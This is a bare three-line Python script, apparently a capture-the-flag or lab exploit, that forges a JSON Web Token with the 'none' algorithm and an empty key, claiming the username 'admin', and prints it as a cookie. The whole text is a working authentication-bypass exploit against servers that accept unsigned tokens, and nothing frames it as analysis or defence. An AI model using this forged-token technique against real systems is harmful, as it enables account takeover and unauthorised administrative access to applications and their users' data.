import jwt
cookie = jwt.encode({'username':'admin'},'',algorithm='none')
print cookie
